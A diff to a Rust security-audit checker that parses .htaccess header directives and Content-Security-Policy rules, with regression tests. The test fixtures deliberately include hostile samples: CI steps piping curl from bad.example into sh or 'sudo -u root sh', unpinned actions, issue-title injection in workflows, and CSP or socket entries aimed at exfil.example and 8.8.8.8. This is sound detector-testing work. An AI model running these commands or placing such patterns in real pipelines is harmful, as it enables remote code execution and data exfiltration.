+            | "directory"
+            | "directorymatch"
+            | "if"
+            | "elseif"
+            | "else"
+            | "ifdefine"
+            | "ifversion"
+            | "ifdirective"
+            | "ifsection"
+            | "iffile"
+            | "limit"
+            | "limitexcept"
+    )
+}
+
 fn parse_htaccess_headers(text: &str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>) {
     let mut map = BTreeMap::new();
     let mut all = Vec::new();
+    let mut block_stack: Vec<(String, bool)> = Vec::new();
     for (idx, raw) in text.lines().enumerate() {
         let trimmed = raw.trim();
         if trimmed.is_empty() || trimmed.starts_with('#') {
             continue;
         }
-        if let Some((name, value)) = parse_apache_header_set(trimmed) {
+        if let Some(after_lt) = trimmed.strip_prefix('<') {
+            let is_close = after_lt.starts_with('/');
+            let body = after_lt.trim_start_matches('/').trim_end_matches('>').trim();
+            let (name_raw, args) = body.split_once(char::is_whitespace).unwrap_or((body, ""));
+            let name = name_raw.to_ascii_lowercase();
+            if is_close {
+                if let Some(pos) = block_stack.iter().rposition(|(tag, _)| tag == &name) {
+                    block_stack.truncate(pos);
+                }
+            } else {
+                let is_negated_ifmodule = name == "ifmodule" && args.trim_start().trim_start_matches(['"', '\'']).starts_with('!');
+                let is_scoped = is_scoped_apache_block_tag(&name) || is_negated_ifmodule;
+                block_stack.push((name, is_scoped));
+            }
+            continue;
+        }
+        let in_scoped = block_stack.iter().any(|(_, scoped)| *scoped);
+        if let Some((action, name, value)) = parse_apache_header_directive(trimmed) {
             let key = name.to_ascii_lowercase();
-            map.insert(key.clone(), (idx + 1, value.clone()));
-            all.push((key, idx + 1, value));
+            if action == "unset" {
+                if !in_scoped {
+                    map.remove(&key);
+                }
+                all.push((format!("__unset__:{key}"), idx + 1, value));
+            } else if matches!(action.as_str(), "edit" | "edit*" | "merge") {
+                all.push((format!("__mutate__:{action}:{key}"), idx + 1, value));
+            } else {
+                if !in_scoped {
+                    map.insert(key.clone(), (idx + 1, value.clone()));
+                }
+                all.push((key, idx + 1, value));
+            }
         }
     }
     (map, all)
 }
 
-fn parse_apache_header_set(trimmed: &str) -> Option<(String, String)> {
-    let first = next_ws_token(trimmed)?;
-    if !first.0.eq_ignore_ascii_case("header") {
+fn parse_apache_header_directive(trimmed: &str) -> Option<(String, String, String)> {
+    let first = next_apache_token(trimmed)?;
+    if !unquote_scalar(first.0).eq_ignore_ascii_case("header") {
         return None;
     }
-    let mut tok = next_ws_token(first.1.trim_start())?;
-    if tok.0.eq_ignore_ascii_case("always") || tok.0.eq_ignore_ascii_case("onsuccess") {
-        tok = next_ws_token(tok.1.trim_start())?;
+    let mut tok = next_apache_token(first.1)?;
+    let cond = unquote_scalar(tok.0);
+    if cond.eq_ignore_ascii_case("always") || cond.eq_ignore_ascii_case("onsuccess") {
+        tok = next_apache_token(tok.1)?;
     }
-    if !matches!(tok.0.to_ascii_lowercase().as_str(), "set" | "setifempty" | "add" | "append") {
+    let action = unquote_scalar(tok.0).to_ascii_lowercase();
+    if !matches!(action.as_str(), "set" | "setifempty" | "add" | "append" | "unset" | "edit" | "edit*" | "merge") {
         return None;
     }
-    let (name, val_part) = next_ws_token(tok.1.trim_start())?;
-    Some((name.to_owned(), unquote_scalar(val_part).to_owned()))
+    let (raw_name, val_part) = next_apache_token(tok.1)?;
+    let name = unquote_scalar(raw_name).trim_end_matches(':').trim().to_owned();
+    if name.is_empty() {
+        return None;
+    }
+    Some((action, name, unquote_scalar(val_part.trim()).to_owned()))
 }
 
-fn next_ws_token(s: &str) -> Option<(&str, &str)> {
+fn next_apache_token(s: &str) -> Option<(&str, &str)> {
     let trimmed = s.trim_start();
     if trimmed.is_empty() {
         return None;
+    }
+    let bytes = trimmed.as_bytes();
+    if matches!(bytes[0], b'"' | b'\'') {
+        let q = bytes[0];
+        let mut i = 1usize;
+        while i < bytes.len() {
+            if bytes[i] == b'\\' && q == b'"' && i + 1 < bytes.len() {
+                i += 2;
+                continue;
+            }
+            if bytes[i] == q {
+                let end = i + 1;
+                return trimmed.split_at_checked(end);
+            }
+            i += 1;
+        }
+        return Some((trimmed, ""));
     }
     match trimmed.find(char::is_whitespace).and_then(|idx| trimmed.split_at_checked(idx)) {
         Some((tok, rest)) => Some((tok, rest)),
@@ -1730,7 +2751,17 @@ fn validate_required_web_headers(
         }
     }
     for (key, line, val) in all_entries {
-        if key == "content-security-policy" {
+        if let Some(unset_hdr) = key.strip_prefix("__unset__:") {
+            if REQUIRED.iter().any(|&(req, _)| req == unset_hdr) {
+                push_v(violations, 5, rel, *line, format!("forbids `Header ... unset {unset_hdr}` on required security header"));
+            }
+        } else if let Some(mut_spec) = key.strip_prefix("__mutate__:")
+            && let Some((act, hdr)) = mut_spec.split_once(':')
+        {
+            if REQUIRED.iter().any(|&(req, _)| req == hdr) {
+                push_v(violations, 5, rel, *line, format!("forbids `Header ... {act} {hdr}` mutation on required security header"));
+            }
+        } else if key == "content-security-policy" {
             validate_csp_directives(rel, *line, val, violations);
         } else if key == "permissions-policy" {
             let compact: String = val.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
@@ -1747,9 +2778,40 @@ fn validate_required_web_headers(
     }
 }
 
+fn is_allowed_csp_hash_source(tok: &str) -> bool {
+    let Some(inner) = tok.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')) else {
+        return false;
+    };
+    let Some(digest) = inner.strip_prefix("sha256-").or_else(|| inner.strip_prefix("sha384-")).or_else(|| inner.strip_prefix("sha512-")) else {
+        return false;
+    };
+    !digest.is_empty() && digest.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
+}
+
+fn is_allowed_csp_source_token(dir_name: &str, tok: &str) -> bool {
+    matches!(tok, "'self'" | "'none'" | "'unsafe-inline'" | "'wasm-unsafe-eval'")
+        || is_allowed_csp_hash_source(tok)
+        || (tok == "data:" && matches!(dir_name, "img-src" | "font-src"))
+        || (tok == "blob:" && dir_name == "img-src")
+}
+
 fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut Vec<TelemetryViolation>) {
     let directives: Vec<String> =
         csp.split(';').map(|d| d.split_whitespace().collect::<Vec<_>>().join(" ").to_ascii_lowercase()).filter(|d| !d.is_empty()).collect();
+
+    let mut seen_names = BTreeSet::new();
+    for dir in &directives {
+        let dir_name = dir.split_whitespace().next().unwrap_or("");
+        if !seen_names.insert(dir_name) {
+            push_v(
+                violations,
+                5,
+                rel,
+                line,
+                format!("`Content-Security-Policy` contains duplicate directive `{dir_name}` (W3C CSP3 first-directive shadowing)"),
+            );
+        }
+    }
 
     for required in REQUIRED_CSP_DIRECTIVES {
         if !directives.iter().any(|d| d == required) {
@@ -1759,10 +2821,7 @@ fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut V
     for dir in &directives {
         let dir_name = dir.split_whitespace().next().unwrap_or("");
         for tok in dir.split_whitespace().skip(1) {
-            let allowed_data = tok == "data:" && matches!(dir_name, "img-src" | "font-src");
-            let allowed_blob = tok == "blob:" && dir_name == "img-src";
-            let is_scheme_source = tok.ends_with(':') && !allowed_data && !allowed_blob;
-            if tok.contains("://") || tok.starts_with("//") || tok.contains('*') || is_scheme_source || tok == "'unsafe-eval'" {
+            if !is_allowed_csp_source_token(dir_name, tok) {
                 push_v(violations, 5, rel, line, format!("`Content-Security-Policy` forbids external/unsafe source `{tok}` in `{dir}`"));
             }
         }
@@ -2117,5 +3176,160 @@ mod tests {
         let (_, hits3) = run_checks(fx3.path()).unwrap();
         assert_eq!(hits3.iter().filter(|v| v.path == "crates/core/src/wasm_evasion.rs").count(), 6, "{hits3:?}");
         assert!(has_hit(&hits3, 2, Some("crates/mcp/src/tools.rs"), "8.8.8.8:80"), "{hits3:?}");
+    }
+
+    #[test]
+    fn aud_12_13_14_15_33_49_hardened_telemetry_regression_suite() {
+        // AUD-12-14: [features] forwarding, dotted keys, quoted section headers, TOML \uXXXX escapes.
+        let fx1 = create_clean_fixture("aud12-14");
+        fx1.write(
+            "crates/core/Cargo.toml",
+            "[package]\nname = \"curvebook-core\"\n[features]\ndefault = [\"web-sys/WebSocket\", \"web-sys?/XmlHttpRequest\"]\n[dependencies]\nweb-sys.features = [\"Window\", \"\\u0042eacon\"]\nreqwest.version = \"0.12\"\nclient.package = \"ureq\"\n[dependencies.\"web-sys\"]\nfeatures = [\"EventSource\"]\n",
+        );
+        let (_, hits1) = run_checks(fx1.path()).unwrap();
+        for needle in ["WebSocket", "XmlHttpRequest", "Beacon", "reqwest", "ureq", "EventSource"] {
+            assert!(has_hit(&hits1, 1, Some("crates/core/Cargo.toml"), needle), "AUD-12-14 missing `{needle}` in {hits1:?}");
+        }
+
+        // AUD-12-13: bare host-source, duplicate CSP directive shadowing, .htaccess unset & scoped blocks.
+        let fx2 = create_clean_fixture("aud12-13");
+        fx2.write(
+            "packaging/web/_headers",
+            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' exfil.example; connect-src 'self'; script-src 'self' evil.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
+        );
+        fx2.write(
+            "packaging/web/.htaccess",
+            "<IfModule mod_headers.c>\n  <FilesMatch \"^never$\">\n    Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  </FilesMatch>\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always unset Referrer-Policy\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
+        );
+        let (_, hits2) = run_checks(fx2.path()).unwrap();
+        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "duplicate directive"), "{hits2:?}");
+        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "exfil.example"), "{hits2:?}");
+        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "evil.example"), "{hits2:?}");
+        assert!(has_hit(&hits2, 5, Some("packaging/web/.htaccess"), "missing `Content-Security-Policy`"), "{hits2:?}");
+        assert!(has_hit(&hits2, 5, Some("packaging/web/.htaccess"), "unset referrer-policy"), "{hits2:?}");
+
+        // AUD-12-15 & AUD-12-49: job named `run:`, multi-line flow permissions/steps, quoted `}}`, bracket indexing, and `| sha256sum` non-false-positive.
+        let fx3 = create_clean_fixture("aud12-15");
+        fx3.write(
+            ".github/workflows/ci.yml",
+            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  run:\n    permissions: {\n      contents: write,\n    }\n    runs-on: ubuntu-latest\n    steps:\n      - { uses: evil/unpinned@main }\n      - { run: \"echo ${{ github.event['issue']['title'] }}\" }\n      - run: |\n          echo \"${{ format('{0}{1}', '}}', github.event.issue.title) }}\"\n          echo \"${{ inputs['version'] }}\"\n          echo \"${{ toJSON(github.event) }}\"\n          echo \"${{ github['head_ref'] }}\"\n          curl -fsSL https://example.com/tool.bin | sha256sum\n",
+        );
+        let (_, hits3) = run_checks(fx3.path()).unwrap();
+        assert!(has_bad_write(&hits3, ".github/workflows/ci.yml", "contents"), "{hits3:?}");
+        assert!(has_hit(&hits3, 4, None, "evil/unpinned@main"), "{hits3:?}");
+        assert!(hits3.iter().filter(|h| h.check == 4 && h.detail.contains("github.event.*")).count() >= 3, "{hits3:?}");
+        assert!(has_hit(&hits3, 4, None, "inputs.*"), "{hits3:?}");
+        assert!(has_hit(&hits3, 4, None, "github.head_ref"), "{hits3:?}");
+        assert!(!has_hit(&hits3, 4, None, "sha256sum"), "AUD-12-49: curl | sha256sum must not false-positive: {hits3:?}");
+
+        // AUD-12-33: production `*_test.rs`, module-level `static` socket, and numeric non-loopback IPs.
+        let fx4 = create_clean_fixture("aud12-33");
+        fx4.write("crates/core/src/t_test.rs", "pub fn leak() { let _ = std::net::TcpStream::connect(\"198.51.100.1:443\"); }\n");
+        fx4.write(
+            "crates/mcp/src/tools.rs",
+            "use std::net::{Ipv4Addr, SocketAddr, TcpListener, TcpStream};\nstatic EXFIL: Option<TcpStream> = TcpStream::connect(\"8.8.8.8:443\").ok();\npub fn ok() { let _ = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)); let _ = TcpListener::bind((Ipv4Addr::UNSPECIFIED, 9000)); let _ = TcpStream::connect(([8, 8, 8, 8], 443)); }\n",
+        );
+        let (_, hits4) = run_checks(fx4.path()).unwrap();
+        assert!(has_hit(&hits4, 2, Some("crates/core/src/t_test.rs"), "TcpStream"), "{hits4:?}");
+        assert!(has_hit(&hits4, 2, Some("crates/mcp/src/tools.rs"), "8.8.8.8:443"), "{hits4:?}");
+        assert!(has_hit(&hits4, 2, Some("crates/mcp/src/tools.rs"), "Ipv4Addr::UNSPECIFIED"), "{hits4:?}");
+
+        // #188 follow-ups:
+        // 1. AUD-12-13: Apache Header edit/edit*/merge mutators + IfDefine/IfVersion/IfDirective/IfSection/IfFile/negated IfModule.
+        let fx5 = create_clean_fixture("aud12-13-mutators");
+        fx5.write(
+            "packaging/web/.htaccess",
+            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always edit Content-Security-Policy \"connect-src 'self'\" \"connect-src *\"\n  Header always edit* Referrer-Policy \"no-referrer\" \"unsafe-url\"\n  Header always merge Permissions-Policy \"camera=*\"\n  <IfDefine NEVER>\n    Header always set Referrer-Policy \"no-referrer\"\n  </IfDefine>\n  <IfModule !mod_headers.c>\n    Header always set X-Content-Type-Options \"nosniff\"\n  </IfModule>\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
+        );
+        let (_, hits5) = run_checks(fx5.path()).unwrap();
+        for needle in [
+            "edit content-security-policy",
+            "edit* referrer-policy",
+            "merge permissions-policy",
+            "missing `Referrer-Policy",
+            "missing `X-Content-Type-Options",
+        ] {
+            assert!(has_hit(&hits5, 5, Some("packaging/web/.htaccess"), needle), "missing `{needle}` in {hits5:?}");
+        }
+
+        // 2. AUD-12-14: `path = "../package"`, multiline TOML strings, top-level dotted features, workspace web-sys aliases.
+        let fx6 = create_clean_fixture("aud12-14-toml");
+        fx6.write(
+            "Cargo.toml",
+            "[workspace]\nmembers = [\"crates/core\"]\n[workspace.dependencies]\nws_alias = { path = \"../package\", version = \"0.3\", package = \"\"\"\nweb-\\\nsys\"\"\" }\n",
+        );
+        fx6.write(
+            "crates/core/Cargo.toml",
+            "features.default = [\"ws_alias/WebSocket\"]\n[package]\nname = \"curvebook-core\"\n[dependencies]\nws_alias = { workspace = true, features = ['''EventSource'''] }\nlocal_ws = { path = \"../package\", version = \"0.3\", package = \"web-sys\", features = [\"Beacon\"] }\n",
+        );
+        let (_, hits6) = run_checks(fx6.path()).unwrap();
+        for needle in ["WebSocket", "EventSource", "Beacon"] {
+            assert!(has_hit(&hits6, 1, Some("crates/core/Cargo.toml"), needle), "missing `{needle}` in {hits6:?}");
+        }
+
+        // 3. AUD-12-15 & AUD-12-49: flow-sequence steps, multiline flow run+uses, next-line flow permissions, shell delimiters & sudo -u root sh.
+        let fx7 = create_clean_fixture("aud12-15-49-flow");
+        fx7.write(
+            ".github/workflows/ci.yml",
+            "name: CI\non: [push]\npermissions:\n  { contents: read, packages: write }\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ uses: evil/one@main }, { run: \"curl https://bad.example/a | sh; echo done\" }]\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - {\n          run: \"echo hi\",\n            uses: evil/two@main\n        }\n      - run: |\n          curl https://bad.example/b |& sh\n          curl https://bad.example/c | { sh; }\n          curl https://bad.example/d | sudo -u root sh\n",
+        );
+        let (_, hits7) = run_checks(fx7.path()).unwrap();
+        assert!(has_bad_write(&hits7, ".github/workflows/ci.yml", "packages"), "{hits7:?}");
+        assert!(has_hit(&hits7, 4, None, "evil/one@main"), "{hits7:?}");
+        assert!(has_hit(&hits7, 4, None, "evil/two@main"), "{hits7:?}");
+        assert!(hits7.iter().filter(|h| h.check == 4 && h.detail.contains("sha256sum")).count() >= 4, "{hits7:?}");
+
+        // 4. AUD-12-33: repeat arrays, IPv6 arrays, from/from_bits, 0b/0o, parenthesized octets.
+        for (label, code) in [
+            ("rep4", "let _ = TcpListener::bind(([0; 4], 9000));"),
+            ("rep8", "let _ = TcpStream::connect(([8; 4], 443));"),
+            ("v6arr", "let _ = TcpListener::bind(([0, 0, 0, 0, 0, 0, 0, 0], 9000));"),
+            ("v4from", "let _ = TcpListener::bind((Ipv4Addr::from(0u32), 9000));"),
+            ("v4bits", "let _ = TcpStream::connect((Ipv4Addr::from_bits(0x0808_0808), 443));"),
+            ("v6bits", "let _ = TcpListener::bind((Ipv6Addr::from_bits(0), 9000));"),
+            ("paren_bin_oct", "let _ = TcpStream::connect((Ipv4Addr::new((8), 0b1000, 0o10, 8u8), 443));"),
+            ("spaced_ctor", "let _ = TcpStream::connect((Ipv4Addr::new (8, 8, 8, 8), 443));"),
+            ("spaced_from", "let _ = TcpListener::bind((Ipv4Addr::from (0u32), 9000));"),
+            ("nested_tuple_arr", "let _ = TcpListener::bind((([0; 4]), 9000));"),
+            ("nested_ip_from_arr", "let _ = IpAddr::from(([0; 4]));"),
+        ] {
+            let fx = create_clean_fixture(&format!("aud12-33-{label}"));
+            fx.write(
+                "crates/mcp/src/tools.rs",
+                &format!("use std::net::{{IpAddr, Ipv4Addr, Ipv6Addr, TcpListener, TcpStream}};\npub fn f() {{ let _ = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)); {code} }}\n"),
+            );
+            let (_, hits) = run_checks(fx.path()).unwrap();
+            assert!(has_hit(&hits, 2, Some("crates/mcp/src/tools.rs"), "non-loopback"), "{label}: expected hit in {hits:?}");
+        }
+    }
+
+    #[test]
+    fn round3_216_apache_toml_workflow_hardening() {
+        // Round-3 #216 items 8 & 9: Apache quoted/colon directives, cross-section web-sys alias shadowing,
+        // multiline quoted run:, inline `with: { run: ... }`, single `&`, `sudo -Eu root sh`, and redirected `{ ... }`.
+        let fx8 = create_clean_fixture("round3-216-apache-toml-wf");
+        fx8.write(
+            "packaging/web/.htaccess",
+            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always \"edit\" \"Content-Security-Policy\" \"connect-src 'self'\" \"connect-src *\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always unset Referrer-Policy:\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
+        );
+        fx8.write(
+            "Cargo.toml",
+            "[workspace]\nmembers = [\"crates/core\"]\n[workspace.dependencies]\nws = { package = \"web-sys\", version = \"0.3\" }\n",
+        );
+        fx8.write(
+            "crates/core/Cargo.toml",
+            "[package]\nname = \"curvebook-core\"\n[dependencies]\nws = { workspace = true, features = [\"WebSocket\"] }\n[dev-dependencies]\nws = { package = \"serde\", version = \"1\" }\n[features]\nevil = [\"ws/EventSource\"]\n",
+        );
+        fx8.write(
+            ".github/workflows/ci.yml",
+            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/m | sh\n        \"\n      - uses: some/action@0123456789abcdef0123456789abcdef01234567\n        with: { run: \"echo ${{ github.event.issue.title }}\" }\n      - { uses: some/action@0123456789abcdef0123456789abcdef01234567, with: { run: \"echo ${{ github.event.pull_request.title }}\" } }\n      - run: |\n          curl https://bad.example/bg | sh&echo done\n          curl https://bad.example/su | sudo -Eu root sh\n          curl https://bad.example/grp | { echo ok; sh; } >/dev/null\n",
+        );
+        let (_, hits8) = run_checks(fx8.path()).unwrap();
+        assert!(has_hit(&hits8, 5, Some("packaging/web/.htaccess"), "edit content-security-policy"), "{hits8:?}");
+        assert!(has_hit(&hits8, 5, Some("packaging/web/.htaccess"), "unset referrer-policy"), "{hits8:?}");
+        assert!(has_hit(&hits8, 1, Some("crates/core/Cargo.toml"), "WebSocket"), "{hits8:?}");
+        assert!(has_hit(&hits8, 1, Some("crates/core/Cargo.toml"), "EventSource"), "{hits8:?}");
+        assert!(hits8.iter().filter(|h| h.check == 4 && h.detail.contains("github.event.*")).count() >= 2, "{hits8:?}");
+        assert!(hits8.iter().filter(|h| h.check == 4 && h.detail.contains("sha256sum")).count() >= 4, "{hits8:?}");
     }
 }
